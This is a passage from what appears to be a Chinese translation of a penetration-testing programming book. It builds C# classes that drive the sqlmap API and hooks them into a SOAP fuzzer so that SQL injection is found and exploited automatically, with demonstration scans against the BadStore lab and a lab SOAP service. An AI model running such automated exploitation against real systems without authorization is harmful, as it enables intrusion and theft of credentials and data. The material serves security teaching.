接下来，我们实现 GetLog() 方法，返回这些 SqlmapLogItem 的列表，然后通过在 /scan/taskid/log 端点执行 GET 请求来检索日志，如 Listing 9-27 所示。

> public List<SqlmapLogItem> GetLog(string taskid)
> 
> {
> 
> JObject tok = JObject.Parse(session.➊ExecuteGet("/scan/" + taskid + "/log"));
> 
> JArray items = tok["log"]➋ as JArray;
> 
> List<SqlmapLogItem> logItems = new List<SqlmapLogItem>();
> 
> ➌foreach (var item in items)
> 
> {
> 
> ➍SqlmapLogItem i = new SqlmapLogItem(); i.Message = (string)item["message"];
> 
> i.Level = (string)item["level"];
> 
> i.Time = (string)item["time"];
> 
> logItems.Add(i);
> 
> }
> 
> ➎return logItems;
> 
> }

Listing 9-27: GetLog() 方法

我们在 GetLog()方法中做的第一件事是向端点发出请求 ➊，并将请求解析为一个 JObject。日志键 ➋ 的值是一个项的数组，因此我们使用 as 运算符将其值提取为 JArray，并将其赋值给 items 变量 ➌。这可能是你第一次看到 as 运算符。我使用它的主要原因是为了提高可读性，但 as 运算符与显式转换的主要区别是，如果左侧的对象不能转换为右侧的类型，as 将返回 null。它不能用于值类型，因为值类型不能为 null。

一旦我们有了日志项数组，我们就创建了一个 SqlmapLogItem 的列表。我们遍历数组中的每个项，每次都实例化一个新的 SqlmapLogItem ➍。然后我们将新对象的值设置为 sqlmap 返回的日志项的值。最后，我们将日志项添加到列表中，并将列表返回给调用方法 ➎。

自动化完整的 sqlmap 扫描

扫描结束后，我们将从控制台应用程序调用 GetLog()并将日志信息打印到屏幕上。您应用程序的逻辑现在应该像 Listing 9-28 一样。

> public static void Main(string[] args)
> 
> {
> 
> using (SqlmapSession session = new SqlmapSession("127.0.0.1", 8775))
> 
> {
> 
> using (SqlmapManager manager = new SqlmapManager(session))
> 
> {
> 
> string taskid = manager.NewTask();
> 
> Dictionary<string, object> options = manager.GetOptions(taskid);
> 
> options["url"] = args[0];
> 
> options["flushSession"] = true;
> 
> manager.StartTask(taskid, options);
> 
> SqlmapStatus status = manager.GetScanStatus(taskid);
> 
> while (status.Status != "terminated")
> 
> {
> 
> System.Threading.Thread.Sleep(new TimeSpan(0,0,10));
> 
> status = manager.GetScanStatus(taskid);
> 
> }
> 
> List<SqlmapLogItem> logItems = manager.➊GetLog(taskid);
> 
> foreach (SqlmapLogItem item in logItems)
> 
> ➋Console.WriteLine(item.Message);
> 
> manager.DeleteTask(taskid);
> 
> }
> 
> }
> 
> }

Listing 9-28：自动化 sqlmap 扫描 URL 的完整 Main()方法

在 sqlmap 主应用程序的末尾添加对 GetLog() ➊的调用后，我们可以遍历日志消息并将其打印到屏幕上 ➋，以便在扫描完成时查看。最后，我们准备运行完整的 sqlmap 扫描并获取结果。将 BadStore URL 作为参数传递给应用程序，将把扫描请求发送给 sqlmap。结果应类似于 Listing 9-29。

> $ ./ch9_automating_sqlmap.exe "http://10.37.129.3/cgi-bin/badstore.cgi?
> 
> searchquery=fdsa&action=search"
> 
> 刷新会话文件
> 
> 正在测试与目标 URL 的连接
> 
> 启发式检测到网页字符集为 'windows-1252'
> 
> 正在检查目标是否受到某种 WAF/IPS/IDS 的保护
> 
> 正在测试目标 URL 是否稳定
> 
> 目标 URL 稳定
> 
> 正在测试 GET 参数 'searchquery' 是否动态
> 
> 确认 GET 参数 'searchquery' 是动态的
> 
> GET 参数 'searchquery' 是动态的
> 
> 启发式检测到网页字符集为 'ascii'
> 
> 启发式（基本）测试显示 GET 参数 'searchquery' 可能是
> 
> 可注入
> 
> （可能的数据库管理系统：'MySQL'）
> 
> –-省略--
> 
> GET 参数 'searchquery➊' 似乎是 'MySQL <= 5.0.11 或基于时间的盲注
> 
> (重查询)' 可注入
> 
> 测试 '通用 UNION 查询 (NULL) - 1 到 20 列'
> 
> 自动扩展 UNION 查询注入技术测试的范围
> 
> 至少发现了其他一种（潜在的）技术
> 
> ORDER BY 技术似乎可用。这应该会减少所需的时间
> 
> 查找正确数量的查询列。自动扩展范围用于
> 
> 当前的 UNION 查询注入技术测试
> 
> 目标 URL 似乎在查询中有 4 列
> 
> GET 参数 'searchquery➋' 是 '通用 UNION 查询 (NULL) - 1 到 20
> 
> 列的可注入性
> 
> 后端 DBMS 是 MySQL➌

列表 9-29：在易受攻击的 BadStore URL 上运行 sqlmap 应用程序

它工作了！来自 sqlmap 的输出可能非常冗长，并且对不熟悉的人来说可能会有些混乱。但尽管它可能需要处理很多信息，仍然有几个关键点需要关注。如输出所示，sqlmap 发现 searchquery 参数容易受到基于时间的 SQL 注入 ➊，存在基于 UNION 的 SQL 注入 ➋，并且数据库是 MySQL ➌。其余的消息是有关 sqlmap 在扫描过程中所做的事情。凭借这些结果，我们可以确定这个 URL 至少容易受到两种 SQL 注入技术的攻击。

将 sqlmap 与 SOAP 模糊测试器集成

我们现在已经看到如何使用 sqlmap API 来审计和利用一个简单的 URL。在第二章和第三章中，我们为 SOAP 端点和 JSON 请求中易受攻击的 GET 和 POST 请求编写了一些模糊测试器。我们可以使用从模糊测试器收集的信息来驱动 sqlmap，并通过仅增加几行代码，从发现潜在的漏洞到完全验证并利用它们。

向 SOAP 模糊测试器添加 sqlmap GET 请求支持

在 SOAP 模糊测试器中只进行两种类型的 HTTP 请求：GET 和 POST 请求。首先，我们为我们的模糊测试器添加支持，使其能够将带有 GET 参数的 URL 发送给 sqlmap。我们还希望能够告诉 sqlmap 我们认为哪个参数可能存在漏洞。我们在 SOAP 模糊测试器控制台应用程序的底部添加了 TestGetRequestWithSqlmap() 和 TestPostRequestWithSqlmap() 方法，用于分别测试 GET 和 POST 请求。稍后的部分我们还将更新 FuzzHttpGetPort()、FuzzSoapPort() 和 FuzzHttpPostPort() 方法，以使用这两个新方法。

让我们开始编写 TestGetRequestWithSqlmap() 方法，如列表 9-30 所示。

> static void TestGetRequestWithSqlmap(string url, string parameter)
> 
> {
> 
> Console.WriteLine("正在用 sqlmap 测试 URL: " + url);
> 
> ➊using (SqlmapSession session = new SqlmapSession("127.0.0.1", 8775))
> 
> {
> 
> using (SqlmapManager manager = new SqlmapManager(session))
> 
> {
> 
> ➋string taskID = manager.NewTask();
> 
> ➌var options = manager.GetOptions(taskID);
> 
> options["url"] = url;
> 
> options["level"] = 1;
> 
> options["risk"] = 1;
> 
> options["dbms"] = ➍"postgresql";
> 
> options["testParameter"] = ➎parameter;
> 
> options["flushSession"] = true;
> 
> manager.➏StartTask(taskID, options); Listing 9-30: TestGetRequestWithSqlmap() 方法的前半部分

方法的前半部分创建了我们的 SqlmapSession ➊ 和 SqlmapManager 对象，我们分别称其为 session 和 manager。然后它创建了一个新任务 ➋，并检索并设置了用于扫描的 sqlmap 选项 ➌。由于我们知道 SOAP 服务使用 PostgreSQL，因此我们显式地将 DBMS 设置为 PostgreSQL ➍。这样可以通过仅测试 PostgreSQL 的 payload 来节省一些时间和带宽。我们还将 testParameter 选项设置为我们之前测试过并发现是易受攻击的参数 ➎，该参数在之前使用单引号进行测试时返回了服务器错误。然后，我们将任务 ID 和选项传递给 manager 的 StartTask() 方法 ➏，以开始扫描。

Listing 9-31 详细介绍了 TestGetRequestWithSqlmap() 方法的后半部分，类似于我们在 Listing 9-25 中编写的代码。

> SqlmapStatus status = manager.GetScanStatus(taskid);
> 
> while (status.Status != ➊"terminated")
> 
> {
> 
> System.Threading.Thread.Sleep(new TimeSpan(0,0,10));
> 
> status = manager.GetScanStatus(taskID);
> 
> }
> 
> List<SqlmapLogItem> logItems = manager.➋GetLog(taskID);
> 
> foreach (SqlmapLogItem item in logItems)
> 
> Console.➌WriteLine(item.Message);
> 
> manager.➍DeleteTask(taskID);
> 
> }
> 
> }
> 
> }

Listing 9-31: TestGetRequestWithSqlmap() 方法的后半部分

方法的后半部分监视扫描直到完成，就像我们最初的测试应用程序一样。由于我们之前已经编写过类似的代码，所以我不会逐行讲解。扫描完成后 ➊，我们使用 GetLog() ➋ 获取扫描结果。然后，我们将扫描结果写到屏幕上 ➌ 以供用户查看。最后，当任务 ID 被传递给 DeleteTask() 方法 ➍ 时，任务会被删除。

添加 sqlmap POST 请求支持

TestPostRequestWithSqlmap() 方法比它的同伴复杂一些。Listing 9-32 显示了该方法的起始部分。

> static void TestPostRequestWithSqlmap(➊string url, string data,
> 
> string soapAction, string vulnValue)
> 
> {
> 
> ➋Console.WriteLine("正在使用 sqlmap 测试 URL: " + url);
> 
> ➌using (SqlmapSession session = new SqlmapSession("127.0.0.1", 8775))
> 
> {
> 
> using (SqlmapManager manager = new SqlmapManager(session))
> 
> {
> 
> ➍string taskID = manager.NewTask();
> 
> var options = manager.GetOptions(taskID);
> 
> options["url"] = url;
> 
> options["level"] = 1;
> 
> options["risk"] = 1;
> 
> options["dbms"] = "postgresql";
> 
> options["data"] = data.➎Replace(vulnValue, "*").Trim();
> 
> options["flushSession"] = "true"; Listing 9-32: TestPostRequestWithSqlmap() 方法的起始部分

TestPostRequestWithSqlmap() 方法接受四个参数➊。第一个参数是将要发送到 sqlmap 的 URL。第二个参数是将包含在 HTTP 请求的 POST 正文中的数据——无论是 POST 参数还是 SOAP XML。第三个参数是将会在 HTTP 请求的 SOAPAction 头中传递的值。最后一个参数是唯一的易受攻击值。在发送到 sqlmap 进行模糊测试之前，它将会在第二个参数的数据中被替换为星号。

在我们向屏幕打印一条消息，告知用户正在测试哪个 URL ➋ 后，我们创建 SqlmapSession 和 SqlmapManager 对象 ➌。然后，像之前一样，我们创建一个新任务并设置当前选项 ➍。特别注意数据选项 ➎。在这里，我们将 POST 数据中的易受攻击值替换为星号。星号是 sqlmap 中的特殊符号，表示“忽略任何类型的智能解析数据，仅在此特定位置查找 SQL 注入”。

在开始任务之前，我们还需要设置一个选项。我们需要在请求的 HTTP 头中设置正确的内容类型和 SOAP 动作。否则，服务器只会返回 500 错误。这正是方法的下一部分所做的，具体细节见清单 9-33。

> string headers = string.Empty;
> 
> 如果 (!string.➊IsNullOrWhitespace(soapAction))
> 
> headers = "Content-Type: text/xml\nSOAPAction: " + ➋soapAction;
> 
> else
> 
> headers = "Content-Type: application/x-www-form-urlencoded";
> 
> options["headers"] = ➌headers;
> 
> manager.StartTask(taskID, options); 清单 9-33：在 TestPostRequestWithSqlmap() 方法中设置正确的头信息

如果 soapAction 变量 ➋（我们希望在 SOAPAction 头中传递的值，告诉 SOAP 服务器我们希望执行的动作）为 null 或空字符串 ➊，我们可以假设这不是一个 XML 请求，而是一个 POST 参数请求。后者只需要将正确的 Content-Type 设置为 x-www-form-urlencoded。如果 soapAction 不是空字符串，那么我们应假设这是一个 XML 请求，然后将 Content-Type 设置为 text/xml，并添加一个 SOAPAction 头，值为 soapAction 变量。设置完正确的头信息后 ➌，我们最终将任务 ID 和选项传递给 StartTask() 方法。

该方法的其余部分，见清单 9-34，应该很熟悉。它只是监视扫描并返回结果，类似于 TestGetRequestWithSqlmap() 方法的功能。

> SqlmapStatus status = manager.➊GetScanStatus(taskID);
> 
> while (status.Status != "terminated")
> 
> {
> 
> System.Threading.Thread.➋Sleep(new TimeSpan(0,0,10));
> 
> status = manager.GetScanStatus(taskID);
> 
> }
> 
> List<SqlmapLogItem> logItems = manager.➌GetLog(taskID);
> 
> foreach (SqlmapLogItem item in logItems)
> 
> Console.➍WriteLine(item.Message);
> 
> manager.➎DeleteTask(taskID);
> 
> }
> 
> }
> 
> }

清单 9-34：TestPostRequestWithSqlmap() 方法中的最终几行

这就像列表 9-25 中的代码一样。我们使用 GetScanStatus() 方法 ➊ 来获取任务的当前状态，在状态未终止的情况下，我们等待 10 秒 ➋。然后再次获取状态。完成后，我们拉取日志项 ➌ 并遍历每一项，打印出日志消息 ➍。最后，当一切完成后，我们删除任务 ➎。

调用新方法

为了完成我们的工具，我们需要从 SOAP 模糊测试器中的各自模糊测试方法调用这些新方法。首先，我们通过在测试是否由于模糊测试而发生语法错误的 if 语句中添加对 TestPostRequestWithSqlmap() 方法的调用，更新了我们在第三章中制作的 FuzzSoapPort() 方法，如列表 9-35 所示。

> if (➊resp.Contains("syntax error"))
> 
> {
> 
> Console.➋WriteLine("参数中可能存在 SQL 注入向量： " +
> 
> type.Parameters[k].Name);
> 
> ➌TestPostRequestWithSqlmap(_endpoint, soapDoc.ToString(),
> 
> op.SoapAction, parm.ToString());
> 
> }

列表 9-35：在 SOAP 模糊测试器的 FuzzSoapPort() 方法中添加对 sqlmap 的支持，来自第三章

在我们原始的 SOAP 模糊测试器中，在 FuzzSoapPort() 方法的最底部，我们测试了响应是否返回了报告语法错误的错误消息 ➊。如果是，我们会打印出注入向量 ➋ 供用户查看。为了让 FuzzSoapPort() 方法使用我们的新方法来测试带有 sqlmap 的 POST 请求，我们只需在原始 WriteLine() 方法调用后添加一行，打印出易受攻击的参数。添加一行调用 TestPostRequestWithSqlmap() 方法 ➌，这样你的模糊测试器就会自动向 sqlmap 提交潜在的易受攻击请求进行处理。

类似地，我们在测试 HTTP 响应中的语法错误的 if 语句中更新了 FuzzHttpGetPort() 方法，如列表 9-36 所示。

> if (resp.Contains("syntax error"))
> 
> {
> 
> Console.WriteLine("参数中可能存在 SQL 注入向量： " +
> 
> input.Parts[k].Name);
> 
> TestGetRequestWithSqlmap(url, input.Parts[k].Name);
> 
> }

列表 9-36：在 SOAP 模糊测试器的 FuzzHttpGetPort() 方法中添加 sqlmap 支持

最后，我们像列表 9-37 所示一样，简单地更新了在 FuzzHttpPostPort() 中测试语法错误的 if 语句。

> if (resp.Contains("syntax error"))
> 
> {
> 
> Console.WriteLine("参数中可能存在 SQL 注入向量： " +
> 
> input.Parts[k].Name);
> 
> TestPostRequestWithSqlmap(url, testParams, null, guid.ToString());
> 
> }

列表 9-37：在 SOAP 模糊测试器的 FuzzHttpPostPort() 方法中添加 sqlmap 支持

添加了这些行到 SOAP 模糊测试器后，它现在不仅会输出潜在的易受攻击参数，还会输出 sqlmap 能够利用漏洞进行 SQL 注入的所有技术。

在 IDE 或终端中运行更新版的 SOAP fuzzer 工具应该会在屏幕上打印出关于 sqlmap 的新信息，如 列表 9-38 所示。

> $ mono ./ch9_automating_sqlmap_soap.exe http://172.18.20.40/Vulnerable.asmx
> 
> 正在获取服务的 WSDL： http://172.18.20.40/Vulnerable.asmx
> 
> 已获取并加载 Web 服务描述。
> 
> 模糊测试服务：VulnerableService
> 
> 模糊测试 SOAP 端口：VulnerableServiceSoap
> 
> 模糊测试操作：AddUser
> 
> 参数中可能存在 SQL 注入向量：username
> 
> ➊ 使用 sqlmap 测试 URL: http://172.18.20.40/Vulnerable.asmx
> 
> --snip--

列表 9-38：使用带有 sqlmap 支持的更新版 SOAP fuzzer 对来自 第三章的漏洞 SOAP 服务进行测试

在 SOAP fuzzer 输出中，注意有关使用 sqlmap 测试 URL ➊的新行。一旦 sqlmap 完成测试 SOAP 请求，sqlmap 日志应该会打印到屏幕上，供用户查看结果。

结论

在本章中，你将看到如何将 sqlmap API 的功能封装成易于使用的 C# 类，从而创建一个小型应用程序，该应用程序可以对作为参数传递的 URL 执行基本的 sqlmap 扫描。在我们创建了基本的 sqlmap 应用程序后，我们将 sqlmap 支持添加到 第三章的 SOAP fuzzer 中，制作一个自动利用和报告潜在漏洞 HTTP 请求的工具。

sqlmap API 可以使用命令行版 sqlmap 工具的任何参数，使其功能强大，甚至更强。通过 sqlmap，你可以利用 C# 技能，在验证给定的 URL 或 HTTP 请求确实存在漏洞后，自动获取密码哈希和数据库用户信息。我们仅仅触及了 sqlmap 对于攻击性渗透测试者或注重安全的开发者的潜力，后者希望更多地接触黑客使用的工具。希望你能花时间深入学习 sqlmap 的更多微妙特性，真正将灵活的安全实践带入你的工作中。
